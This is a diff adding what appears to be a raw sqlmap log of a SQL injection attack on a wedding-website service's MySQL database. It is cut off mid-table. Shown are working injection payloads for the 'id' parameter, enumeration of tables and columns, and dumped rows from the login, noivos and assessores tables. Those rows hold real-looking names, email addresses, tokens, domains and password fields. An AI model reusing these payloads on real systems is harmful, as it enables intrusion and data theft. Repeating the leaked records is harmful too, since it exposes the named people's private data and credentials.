@@ -1,0 +1,564 @@
+sqlmap identified the following injection point(s) with a total of 303 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] dmc_producao
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+[31 tables]
++--------------------+
+| assessores         |
+| blog               |
+| categoria          |
+| contato            |
+| cotas              |
+| faq                |
+| financeiro         |
+| financeiro_site    |
+| galeria            |
+| home               |
+| linha              |
+| lista              |
+| listaOutro         |
+| lista_cat          |
+| login              |
+| noivos             |
+| noticias           |
+| ocasal             |
+| ocasamento         |
+| padrinhos          |
+| paginas            |
+| pais               |
+| recadinhos         |
+| recadinhos_lista   |
+| rsvp               |
+| rsvp_site          |
+| site               |
+| site_desc          |
+| site_planos        |
+| site_planos_textos |
+| textos             |
++--------------------+
+
+Database: dmc_producao
++--------------------+---------+
+| Table              | Entries |
++--------------------+---------+
+| rsvp_site          | 967     |
+| galeria            | 792     |
+| financeiro         | 659     |
+| lista              | 581     |
+| recadinhos         | 500     |
+| cotas              | 417     |
+| rsvp               | 414     |
+| textos             | 373     |
+| padrinhos          | 287     |
+| linha              | 224     |
+| recadinhos_lista   | 201     |
+| categoria          | 119     |
+| ocasamento         | 115     |
+| site_desc          | 92      |
+| home               | 61      |
+| ocasal             | 61      |
+| site               | 58      |
+| paginas            | 56      |
+| noivos             | 52      |
+| financeiro_site    | 18      |
+| site_planos_textos | 13      |
+| assessores         | 11      |
+| listaOutro         | 11      |
+| faq                | 7       |
+| site_planos        | 3       |
+| lista_cat          | 2       |
+| pais               | 2       |
+| contato            | 1       |
+| login              | 1       |
+| noticias           | 1       |
++--------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: financeiro
+[15 columns]
++-------------------+--------------+
+| Column            | Type         |
++-------------------+--------------+
+| data_compra       | date         |
+| data_pag          | date         |
+| descricao         | varchar(255) |
+| email             | varchar(255) |
+| id                | int(11)      |
+| idNoivos          | int(11)      |
+| nome              | varchar(255) |
+| notification_code | varchar(255) |
+| pagamento         | varchar(3)   |
+| preco             | float        |
+| status            | varchar(3)   |
+| telefone          | varchar(30)  |
+| transaction_code  | varchar(255) |
+| valor             | float        |
+| valor_taxa        | float        |
++-------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: login
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| email  | varchar(255) |
+| id     | int(11)      |
+| senha  | varchar(255) |
++--------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: login
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| email  | varchar(255) |
+| id     | int(11)      |
+| senha  | varchar(255) |
++--------+--------------+
+
+Database: dmc_producao
+Table: login
+[1 entry]
++----+-----------+--------------+
+| id | email     | senha        |
++----+-----------+--------------+
+| 1  | 1!^!÷ jòj | 1å¡Íx†\x01ú¬ |
++----+-----------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: financeiro
+[15 columns]
++-------------------+--------------+
+| Column            | Type         |
++-------------------+--------------+
+| data_compra       | date         |
+| data_pag          | date         |
+| descricao         | varchar(255) |
+| email             | varchar(255) |
+| id                | int(11)      |
+| idNoivos          | int(11)      |
+| nome              | varchar(255) |
+| notification_code | varchar(255) |
+| pagamento         | varchar(3)   |
+| preco             | float        |
+| status            | varchar(3)   |
+| telefone          | varchar(30)  |
+| transaction_code  | varchar(255) |
+| valor             | float        |
+| valor_taxa        | float        |
++-------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: cotas
+[6 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| cor      | varchar(100) |
+| id       | int(11)      |
+| idNoivos | int(11)      |
+| textC    | varchar(255) |
+| titulo   | varchar(255) |
+| valor    | float        |
++----------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: padrinhos
+[8 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| fotoF    | varchar(255) |
+| fotoM    | varchar(255) |
+| id       | int(11)      |
+| idNoivos | int(11)      |
+| nomeF    | varchar(255) |
+| nomeM    | varchar(255) |
+| textoF   | text         |
+| textoM   | text         |
++----------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: ocasamento
+[11 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| local       | varchar(255) |
+| data        | date         |
+| endereco    | varchar(255) |
+| hora        | time         |
+| icone       | varchar(100) |
+| id          | int(11)      |
+| idNoivos    | int(11)      |
+| latitude    | varchar(100) |
+| longitude   | varchar(100) |
+| referencial | varchar(255) |
+| titulo      | varchar(255) |
++-------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: ocasal
+[11 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| decF     | text         |
+| decM     | text         |
+| fotoF    | varchar(255) |
+| fotoM    | varchar(255) |
+| id       | int(11)      |
+| idNoivos | int(11)      |
+| nomeF    | varchar(255) |
+| nomeM    | varchar(255) |
+| snomeF   | varchar(255) |
+| snomeM   | varchar(255) |
+| texto    | text         |
++----------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: noivos
+[14 columns]
++-----------------+---------------------+
+| Column          | Type                |
++-----------------+---------------------+
+| acessos         | bigint(20) unsigned |
+| cpf             | varchar(50)         |
+| data_cadastro   | timestamp           |
+| dominio         | varchar(100)        |
+| email           | varchar(255)        |
+| email_pagseguro | varchar(255)        |
+| id              | int(11)             |
+| idAssessor      | int(11)             |
+| nome            | varchar(255)        |
+| pastaFTP        | varchar(100)        |
+| rg              | varchar(50)         |
+| senha           | varchar(255)        |
+| telefone        | varchar(50)         |
+| token           | varchar(255)        |
++-----------------+---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: noivos
+[14 columns]
++-----------------+---------------------+
+| Column          | Type                |
++-----------------+---------------------+
+| acessos         | bigint(20) unsigned |
+| cpf             | varchar(50)         |
+| data_cadastro   | timestamp           |
+| dominio         | varchar(100)        |
+| email           | varchar(255)        |
+| email_pagseguro | varchar(255)        |
+| id              | int(11)             |
+| idAssessor      | int(11)             |
+| nome            | varchar(255)        |
+| pastaFTP        | varchar(100)        |
+| rg              | varchar(50)         |
+| senha           | varchar(255)        |
+| telefone        | varchar(50)         |
+| token           | varchar(255)        |
++-----------------+---------------------+
+
+Database: dmc_producao
+Table: noivos
+[13 entries]
++----+------------+---------+---------+-----------------------+-------------------------------------------+----------------------------------+-------------------------------------------+---------------------------------+---------+----------------+----------+---------------------+-------------------------------+
+| id | idAssessor | rg      | cpf     | nome                  | senha                                     | token                            | email                                     | dominio                         | acessos | pastaFTP       | telefone | data_cadastro       | email_pagseguro               |
++----+------------+---------+---------+-----------------------+-------------------------------------------+----------------------------------+-------------------------------------------+---------------------------------+---------+----------------+----------+---------------------+-------------------------------+
+| 4  | 0          | <blank> | <blank> | Bruno                 | U…[\x1cmÝýˆÝ/ÎÌÀ\x10                      | 2DE761AF15E844BC84CECC0E32C986C7 | \x0b¥{<MMÊîS3¿Ô;M¦#ÃH\\clUÀ»šžÐ           | NULL                            | 0       | thatiebruno    | <blank>  | 2017-02-16 21:49:51 | brunogiordanoneto@gmail.com   |
+| 6  | 0          | <blank> | <blank> | Rene Svoboda Candella | /H\x19@p­*q[PS                            | A489F0043E2544DDAB8F6FDFE7357B2A | q2°W-¸Þ)\x07\x12€,s'\x16Ù»ìÕ\nëU\x04\x0e  | NULL                            | 0       | camilaerene    | <blank>  | 2017-02-16 21:49:51 | camila.clbc@yahoo.com.br      |
+| 11 | 8          | <blank> | <blank> | Debora e Daniel       | Ñ^\x1aý\x10ŒX\x13Ñ8úT7                    | 3B6F273789664C2BA5EF4A60F7229634 | w~:Ý0¬ØpHT)¹´BSåÑÙ(\r—P{py\x1a\x06\x18    | casamentodeboraedaniel.com.br   | 3       | danieledebora  | <blank>  | 2017-02-16 21:49:51 | deboraccmartins@yahoo.com.br  |
+| 12 | 8          | <blank> | <blank> | Raquel e Vini         | \x11m\x11iÙµ¬Ø‘\x07"&                     | 9F7FE505FBE840A5A8EAE5C08ACE5F18 | Ënj²7Ãº~±P\nÉY\x16ö8ØSGxwNÛ \x81…Ë        | NULL                            | 9       | vinieraquel    | <blank>  | 2017-02-16 21:49:51 | quelvinicasamento@gmail.com   |
+| 13 | 8          | <blank> | <blank> | Su e Paulinho         | SLHt¹î%ï,                                 | 31953AE7BB244BEEA896162C8A8CE6F2 | 1!z·Nß=\x10ÒûÐV”\x01ÌS\n‡8—^‡„è³¶         | casamentosuepaulinho.com.br     | 2       | suepaulo       | <blank>  | 2017-02-16 21:49:51 | pauloivan@extinpaul.com.br    |
+| 14 | 0          | <blank> | <blank> | Isabella              | \x7f‰?bOå                                 | C850D6FF2BDB48E69D9E83EAB2FA9230 | \x7f‰?Ò¶?¨á3L\rø\x0eò¬N¨\x1e—åú           | NULL                            | 0       | isaegu         | <blank>  | 2017-02-16 21:49:51 | isagavazza@bol.com.br         |
+| 16 | 8          | <blank> | <blank> | Debora e Joao         | q2–hÔœ”žd                                 | 22132EE0B79941A8958DB5D7064E5B6C | w~:Ý0¬ÉïRÆã}Ò\x07ŒÅFMYfiPÅ¾Ÿ›Õ            | deboraejoaopedro.com.br         | 3       | deborajoao     | <blank>  | 2017-02-16 21:49:51 | deboratorresnutri@gmail.com   |
+| 17 | 8          | <blank> | <blank> | Priscila e Felipe     | 1·MˆÖÃ0\x16©3¦\x1fÖl<\x06\x1cpûf‚»V½"V0/‚ | 06BA3CCF73A1448DA809C35B43520BED | 1·MˆÖÃ0\x16©3¦\x1fÖl<\x06\x1cpûf‚»V½"V0/‚ | casamentopriefelipe.com.br      | 4       | priefelipe     | <blank>  | 2017-02-16 21:49:51 | priscila.pereira.ri@gmail.com |
+| 19 | 9          | <blank> | <blank> | Ana e Victor          | \x15;*w1ÅÓj/Üö"™                          | 5C16DC98D3BD46ABAB30F524ED321596 | \x15;* ¯Ò1\x07Åì\x19\t™ñÎ\x1b”­”Kª        | NULL                            | 0       | anaevictor     | <blank>  | 2017-02-16 21:49:51 | anakachan@hotmail.com         |
+| 20 | 9          | <blank> | <blank> | Bruna e Luiz          | \x0b¥{<¡ó-E¼º                             | 612271E81D7241AE8743481936F1A219 | \x0b¥{<¡¦7œd“\x12é„ø¦D¢\x14               | NULL                            | 0       | brunaeluiz     | <blank>  | 2017-02-16 21:49:51 | brunabkm@gmail.com            |
+| 22 | 8          | <blank> | <blank> | Flávia e Rick         | ì–\x0f‰ý†Ý\x02¨)8&                        | 73AA13AF432E4B5FB88B01566AEF51AF | k¶/³\x8d4»¯x\x8fódø\rJ\x0f>wf             | casamentoflaerick.com.br        | 192     | flaviaerick    | <blank>  | 2017-02-16 21:49:51 | fla0701@hotmail.com           |
+| 23 | 8          | <blank> | <blank> | Ana e Rafael          | Ã\x1b\nW»«Å\x167                          | BF8E195A40C24C1A8A359272F0CF55AC | ƒ#H'Ü\x13LJ:ït~â\x17P\x15$m|              | casamentoanapaulaerafael.com.br | 275     | anaerafa       | <blank>  | 2017-02-16 21:49:51 | rafadsouz@gmail.com           |
+| 24 | 10         | <blank> | <blank> | Andréia e Carlos      | Ã\x1bh\x8fØä–w\x17T)M*æ\t                 | 8FE5D553FEF640A6A8186A572EAB4C62 | \x15;H¯øÄ¶vlÝÀWÌÅäñíD»„óZqzs              | andreiaecarlos.com.br           | 0       | andreiaecarlos | <blank>  | 2017-02-16 21:49:51 | andreiaishihara@gmail.com     |
++----+------------+---------+---------+-----------------------+-------------------------------------------+----------------------------------+-------------------------------------------+---------------------------------+---------+----------------+----------+---------------------+-------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (2136=2136) THEN 3 ELSE (SELECT 6095 UNION SELECT 2037) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=3 AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71767a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+back-end DBMS: MySQL >= 5.0
+Database: dmc_producao
+Table: assessores
+[4 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| email  | varchar(255) |
+| id     | int(11)      |
+| nome   | varchar(255) |
+| senha  | varchar(255) |
++--------+--------------+
+
+Database: dmc_producao
+Table: assessores
+[11 entries]
++----+----------------------------+------------------------------------------------------+--------------------+
+| id | nome                       | email                                                | senha              |
++----+----------------------------+------------------------------------------------------+--------------------+
+| 2  | Megafest Eventos           | melany@megafestproducoes.com                         | 6D65676166657374   |
+| 5  | teste                      | `n…E÷                                                | `n…E÷              |
+| 6  | zica                       | ã YI¶G_ª\x11+                                        | S¿FV©Xj·\x0c7      |
+| 7  | BLAM Eventos               | qÞ"E¼ÐL®òéŽy®î†}`/\x18˜Qˆ‹ç¼¹                        | Uåý­ã%ù\x17¯¤\x1c7 |
+| 8  | KMS Eventos                | \x15R·P ×\x14hWUË¡T Lä‰`ìf>).#\x0cW1.ƒÌ)+            | ‰­’cNë             |
